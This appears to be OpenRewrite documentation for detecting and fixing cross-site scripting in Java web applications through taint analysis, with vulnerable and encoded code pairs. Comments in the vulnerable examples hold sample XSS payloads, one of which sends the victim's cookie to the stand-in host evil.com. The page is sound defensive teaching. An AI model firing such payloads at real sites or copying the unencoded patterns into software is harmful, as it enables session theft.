---
description: Detect and prevent Cross-Site Scripting (XSS) vulnerabilities in web applications.
---

# Cross-Site Scripting (XSS) detection

Cross-Site Scripting (XSS) vulnerabilities allow attackers to inject malicious scripts into web pages viewed by other users. These scripts can steal cookies, hijack sessions, deface websites, or redirect users to malicious sites. OpenRewrite's XSS detection uses taint analysis to find where untrusted data flows into HTML output without proper encoding.

## Understanding XSS vulnerabilities

Think of XSS like someone slipping executable instructions into a trusted document. Imagine a shared recipe book where users can add their own recipes. If someone writes "Step 3: Instead of adding salt, give me your wallet," and the cookbook automatically performs whatever is written, that's essentially XSS. 

In web applications, attackers inject JavaScript code into pages that browsers trustingly execute, allowing them to steal data, hijack sessions, or perform actions as the victim.

### Types of XSS

XSS attacks come in three main flavors, each with different persistence and impact characteristics. Understanding these distinctions helps you recognize vulnerable patterns in your own code and prioritize fixes based on risk.

```java
// Reflected XSS - immediate reflection of user input
String name = request.getParameter("name");
response.getWriter().write("<h1>Hello " + name + "</h1>");
// Attack: ?name=<script>alert('XSS')</script>

// Stored XSS - persisted malicious content  
String comment = request.getParameter("comment");
database.save(comment);
// Later...
String saved = database.getComment();
response.getWriter().write("<div>" + saved + "</div>");

// DOM XSS - client-side vulnerability (not covered by this analysis)
// <script>
//   document.getElementById('output').innerHTML = location.hash.substring(1);
// </script>
```

## How OpenRewrite Detects XSS

The `FindXssVulnerability` recipe tracks untrusted data from various sources to HTML output sinks:

### 1. Identifying Sources

The first step in preventing XSS is knowing where untrusted data enters your application. Think of these as the "entry points" where an attacker might try to inject malicious code. Any data that comes from outside your application's control should be treated as potentially dangerous until proven otherwise.

```java
// Web input sources
request.getParameter("search")          // URL parameters
request.getHeader("User-Agent")         // HTTP headers
request.getCookies()[0].getValue()      // Cookie values
request.getQueryString()                // Full query string
request.getPathInfo()                   // URL path segments

// Database sources (for stored XSS)
resultSet.getString("user_comment")     // Database content
entity.getUserContent()                 // JPA entities

// File sources
Files.readString(uploadedFile)          // User uploads
properties.getProperty("user.data")     // Configuration
```

### 2. Tracking Through Transformations

Malicious data doesn't stay in one place – it flows through your application, getting combined with other strings, trimmed, formatted, and passed between methods. Each transformation preserves the "tainted" nature of the data. OpenRewrite's taint analysis follows these transformations to ensure that dangerous input is tracked no matter how it's modified.

```java
String input = request.getParameter("q");           // TAINTED
String trimmed = input.trim();                      // TAINTED
String message = "You searched for: " + trimmed;    // TAINTED
String wrapped = "<div>" + message + "</div>";      // TAINTED
response.getWriter().write(wrapped);                // XSS VULNERABILITY!
```

### 3. Identifying HTML Output Sinks

The final piece of the XSS puzzle is where data gets written to HTML responses. These "sinks" are the places where tainted data becomes executable code in a user's browser. OpenRewrite recognizes various output methods across different frameworks and libraries, helping you spot vulnerabilities regardless of your tech stack.

```java
// Servlet/JSP outputs
response.getWriter().write(html)
response.getWriter().print(html)
response.getWriter().println(html)
response.getOutputStream().write(html.getBytes())
out.print(html)  // JSP out object

// Spring MVC model attributes (when not escaped by view)
model.addAttribute("userContent", taintedData)
modelAndView.addObject("html", taintedData)

// Template engines (when raw output is used)
model.put("rawHtml", taintedData)  // If template uses {{{rawHtml}}}
```

## Common XSS Patterns

### Basic Reflection

The most straightforward XSS vulnerability occurs when user input is directly embedded into HTML without any encoding. This pattern is surprisingly common in legacy code or quick prototypes that never got properly secured.

```java
// VULNERABLE - Direct reflection
@GetMapping("/search")
public void search(HttpServletRequest request, HttpServletResponse response) 
        throws IOException {
    String query = request.getParameter("q");
    response.getWriter().write(
        "<html><body>Search results for: " + query + "</body></html>"
    );
}
// Attack: ?q=<script>document.location='http://evil.com?c='+document.cookie</script>
```

### Attribute Injection

HTML attributes present a special challenge because attackers can break out of the attribute context even when developers think they're being careful. Quotes alone won't save you—attackers know how to escape them.

```java
// VULNERABLE - Unquoted attributes
String color = request.getParameter("color");
response.getWriter().write("<div style=background:" + color + ">Content</div>");
// Attack: ?color=red%20onmouseover=alert(1)
// Result: <div style=background:red onmouseover=alert(1)>Content</div>

// VULNERABLE - Even with quotes
String title = request.getParameter("title");
response.getWriter().write("<div title='" + title + "'>Content</div>");
// Attack: ?title=x' onmouseover='alert(1)
```

### JavaScript Context

Embedding user data directly into JavaScript code is particularly dangerous because you're literally putting untrusted data into an execution context. The attacker's payload becomes part of your application's logic.

```java
// VULNERABLE - Data in JavaScript
String username = request.getParameter("user");
response.getWriter().write(
    "<script>var user = '" + username + "'; processUser(user);</script>"
);
// Attack: ?user=x'; alert(1); //
// Result: <script>var user = 'x'; alert(1); //'; processUser(user);</script>
```

### JSON Injection

JSON data embedded in script tags needs special attention. While `JSON.stringify()` helps, manually building JSON strings opens the door to injection attacks that can break out of the data context.

```java
// VULNERABLE - Improper JSON encoding
String data = request.getParameter("data");
response.getWriter().write(
    "<script>var config = {data: '" + data + "'};</script>"
);
// Attack: ?data=x'}; alert(1); //
```

## Safe Patterns and Remediation

### HTML Entity Encoding

HTML entity encoding is your first and most important line of defense against XSS. By converting dangerous characters like `<`, `>`, and `"` into their HTML entity equivalents (`&lt;`, `&gt;`, `&quot;`), you ensure that user input is displayed as text rather than executed as code.

```java
// SAFE - Using OWASP Java Encoder
import org.owasp.encoder.Encode;

@GetMapping("/search")
public void search(HttpServletRequest request, HttpServletResponse response) 
        throws IOException {
    String query = request.getParameter("q");
    response.getWriter().write(
        "<html><body>Search results for: " + 
        Encode.forHtml(query) + 
        "</body></html>"
    );
}

// SAFE - Context-specific encoding
String userContent = request.getParameter("content");
response.getWriter().write(
    "<div title='" + Encode.forHtmlAttribute(userContent) + "'>" +
    Encode.forHtml(userContent) + 
    "</div>"
);
```

### Using Framework Protection

Modern frameworks have learned from years of XSS vulnerabilities and now provide automatic escaping by default. Understanding how your framework handles output encoding lets you write secure code without constantly worrying about XSS.

```java
// SAFE - Spring with Thymeleaf (auto-escapes by default)
@GetMapping("/profile")
public String profile(@RequestParam String name, Model model) {
    model.addAttribute("username", name);
    return "profile";  // profile.html uses [[${username}]]
}

// SAFE - JSP with JSTL (c:out escapes by default)
// <c:out value="${param.userInput}"/>

// SAFE - Spring Security's tag library
// <sec:authentication property="principal.username" htmlEscape="true"/>
```

### Content Security Policy

Content Security Policy (CSP) acts as a safety net by telling browsers which scripts are allowed to run. Even if an XSS vulnerability exists, CSP can prevent the injected script from executing, turning a critical vulnerability into a minor annoyance.

```java
// Add CSP header to prevent inline scripts
@Component
public class SecurityHeadersFilter implements Filter {
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, 
                        FilterChain chain) throws IOException, ServletException {
        HttpServletResponse httpResponse = (HttpServletResponse) response;
        httpResponse.setHeader("Content-Security-Policy", 
            "default-src 'self'; script-src 'self' 'nonce-" + generateNonce() + "'");
        chain.doFilter(request, response);
    }
}
```

### Context-Aware Encoding

One encoding method doesn't fit all situations. HTML content, attributes, JavaScript, CSS, and URLs each have their own special characters and escape sequences. Using the right encoding for each context ensures comprehensive protection.

```java
public class SafeHtmlBuilder {
    public String buildHtml(UserData data) {
        return new StringBuilder()
            // HTML context
            .append("<div>").append(Encode.forHtml(data.getName())).append("</div>")
            
            // Attribute context  
            .append("<input value='").append(Encode.forHtmlAttribute(data.getValue())).append("'>")
            
            // JavaScript context
            .append("<script>var data = ").append(Encode.forJavaScript(data.getJson())).append(";</script>")
            
            // URL context
            .append("<a href='/user/").append(Encode.forUriComponent(data.getId())).append("'>Link</a>")
            
            // CSS context
            .append("<style>.user { color: ").append(Encode.forCssString(data.getColor())).append("; }</style>")
            
            .toString();
    }
}
```

## Advanced XSS Detection Features

### Stored XSS Detection

Stored XSS is particularly dangerous because the malicious code persists in your database, affecting every user who views the infected content. OpenRewrite tracks tainted data even when it takes a detour through your database, helping you catch these delayed-action vulnerabilities.

```java
// Phase 1: Malicious data stored
public void saveComment(HttpServletRequest request) {
    String comment = request.getParameter("comment");  // TAINTED
    Comment entity = new Comment();
    entity.setText(comment);                           // Taint tracked to field
    commentRepository.save(entity);                    // Persisted tainted data
}

// Phase 2: Vulnerable display (potentially in different request)
public void displayComments(HttpServletResponse response) {
    List<Comment> comments = commentRepository.findAll();
    for (Comment comment : comments) {
        // OpenRewrite tracks that comment.getText() may contain tainted data
        response.getWriter().write("<div>" + comment.getText() + "</div>"); // XSS!
    }
}
```

### Rich Content Handling

Allowing users to submit formatted content (like blog posts or comments with basic HTML) creates a tricky balance between functionality and security. Simple regex-based filtering rarely works – attackers are creative and will find ways around your patterns.

```java
// VULNERABLE - Allowing some HTML
public String processRichText(String userHtml) {
    // Dangerous: only removes script tags
    return userHtml.replaceAll("<script.*?>.*?</script>", "");
    // Attacker can use: <img src=x onerror=alert(1)>
}

// SAFER - Using a sanitization library
public String processRichText(String userHtml) {
    PolicyFactory policy = new HtmlPolicyBuilder()
        .allowElements("p", "b", "i", "em", "strong")
        .allowAttributes("href").onElements("a")
        .requireRelNofollowOnLinks()
        .toFactory();
    return policy.sanitize(userHtml);
}
```

### Template Injection Detection

Template engines add another layer of complexity to XSS prevention. When user input controls which template gets rendered or what expressions get evaluated, attackers can potentially execute arbitrary code on your server, not just in browsers.

```java
// VULNERABLE - User controls template
public String renderTemplate(String templateName, Model model) {
    String template = request.getParameter("template");  // User controlled!
    return templateEngine.process(template, model);      // Template injection
}

// VULNERABLE - Unsafe template expressions
model.addAttribute("userExpression", request.getParameter("expr"));
// Template: <div th:utext="${userExpression}"></div>  // Unescaped output!
```

## Recipe Configuration

### Basic Usage

```yaml
# In rewrite.yml
---
type: specs.openrewrite.org/v1beta/recipe
name: com.example.XssScan
recipeList:
  - org.openrewrite.analysis.java.security.FindXssVulnerability
```

### Custom XSS Detection

Every application has its own unique patterns and custom frameworks. OpenRewrite's XSS detection can be extended to understand your specific code patterns, ensuring that your custom HTML rendering methods don't become security blind spots.

```java
public class CustomXssRecipe extends FindXssVulnerability {
    @Override
    protected XssSpec createSpec() {
        return new XssSpec() {
            @Override
            public boolean isSink(Tree tree) {
                if (tree instanceof J.MethodInvocation) {
                    J.MethodInvocation method = (J.MethodInvocation) tree;
                    
                    // Custom template engine
                    if ("renderUnsafe".equals(method.getSimpleName())) {
                        return true;
                    }
                    
                    // Custom response writer
                    if ("writeHtmlResponse".equals(method.getSimpleName())) {
                        return true;
                    }
                }
                return super.isSink(tree);
            }
            
            @Override
            public boolean isSanitizer(J.MethodInvocation method) {
                // Custom sanitization method
                if ("sanitizeHtml".equals(method.getSimpleName())) {
                    return true;
                }
                return super.isSanitizer(method);
            }
        };
    }
}
```

## Framework-Specific Considerations

### Spring MVC

Spring MVC generally handles XSS well with its view technologies, but you need to understand when you're stepping outside the framework's protection. The difference between returning a view name and returning raw HTML directly can be the difference between secure and vulnerable.

```java
// SAFE - Spring automatically escapes in views
@Controller
public class UserController {
    @GetMapping("/user")
    public String user(@RequestParam String name, Model model) {
        model.addAttribute("name", name);
        return "user";  // user.html with ${name} is auto-escaped
    }
}

// VULNERABLE - Bypassing escaping
@GetMapping("/raw")
@ResponseBody
public String raw(@RequestParam String html) {
    return "<html><body>" + html + "</body></html>";  // No escaping!
}
```

### JSP Best Practices

JSP has been around for decades, and its various expression languages offer different levels of protection. Knowing which syntax automatically escapes output and which doesn't can save you from introducing vulnerabilities in legacy codebases.

```jsp
<%-- VULNERABLE - Direct expression --%>
<%= request.getParameter("name") %>

<%-- VULNERABLE - Unescaped EL --%>
<div>${param.userInput}</div>

<%-- SAFE - Using c:out --%>
<c:out value="${param.userInput}"/>

<%-- SAFE - Using fn:escapeXml --%>
${fn:escapeXml(param.userInput)}
```

### React/Angular Integration

Single-page applications handle XSS differently than traditional server-rendered pages. When your backend becomes a pure API, the responsibility for encoding shifts to the frontend framework. Modern frameworks like React and Angular escape by default, but you still need to be careful about how you structure your API responses.

```java
// SAFE - Return JSON, let framework handle rendering
@RestController
public class ApiController {
    @GetMapping("/api/user")
    public UserDto getUser(@RequestParam String id) {
        // Return data, not HTML
        return new UserDto(id, getUserName(id));
    }
}

// Frontend handles encoding:
// React: {userData.name} // Auto-escaped
// Angular: {{userData.name}} // Auto-escaped
```

## Testing XSS Detection

### Unit Tests

Testing your XSS detection rules ensures they catch real vulnerabilities without flooding you with false positives. These tests demonstrate both vulnerable patterns that should be flagged and safe patterns that shouldn't trigger warnings.

```java
@Test
void detectsBasicXss() {
    rewriteRun(
        java("""
            import javax.servlet.http.*;
            import java.io.IOException;
            
            class XssServlet extends HttpServlet {
                void doGet(HttpServletRequest req, HttpServletResponse resp) 
                        throws IOException {
                    String name = req.getParameter("name");
                    ~~>resp.getWriter().write("<h1>Hello " + name + "</h1>");
                }
            }
            """)
    );
}

@Test
void allowsProperlyEncodedOutput() {
    rewriteRun(
        java("""
            import javax.servlet.http.*;
            import java.io.IOException;
            import org.owasp.encoder.Encode;
            
            class SafeServlet extends HttpServlet {
                void doGet(HttpServletRequest req, HttpServletResponse resp) 
                        throws IOException {
                    String name = req.getParameter("name");
                    resp.getWriter().write("<h1>Hello " + Encode.forHtml(name) + "</h1>");
                }
            }
            """)
    );
}
```

## Common Challenges

### False Positives

Not every instance of writing user data to output is dangerous. Understanding when XSS isn't possible helps you focus on real vulnerabilities and avoid alert fatigue from false positives.

```java
// Might be flagged but is actually safe
public void writeJson(HttpServletResponse response, Object data) {
    response.setContentType("application/json");
    // JSON encoding prevents XSS when Content-Type is set correctly
    response.getWriter().write(gson.toJson(data));
}

// Suppress with annotation if needed
@SuppressWarnings("XSS")
public void trustedHtmlOutput(String trustedHtml) {
    // Document why this is safe
    response.getWriter().write(trustedHtml);
}
```

### Complex Data Flows

Real applications rarely have simple, direct flows from input to output. Data passes through collections, gets transformed by streams, and moves between objects. OpenRewrite's taint analysis tracks these complex paths to ensure nothing slips through.

```java
// Taint through collections and transformations
List<String> inputs = new ArrayList<>();
inputs.add(request.getParameter("item1"));  // Tainted list
inputs.add(request.getParameter("item2"));

String html = inputs.stream()
    .map(item -> "<li>" + item + "</li>")  // Still tainted!
    .collect(Collectors.joining());

response.getWriter().write("<ul>" + html + "</ul>");  // XSS!
```

## Performance Considerations

XSS detection is typically fast because:
1. **Focused on I/O**: Only analyzes request handling and response generation
2. **Early termination**: Stops tracking when data is sanitized
3. **Common patterns**: Optimized for typical web frameworks

## Next Steps

* [SQL Injection](./sql-injection.md) - Similar taint analysis for database queries
* [Command Injection](./command-injection.md) - OS command vulnerabilities

:::tip Defense in Depth
XSS prevention requires multiple layers: input validation, output encoding, Content Security Policy, and secure frameworks. Automated detection helps but isn't a complete solution.
:::
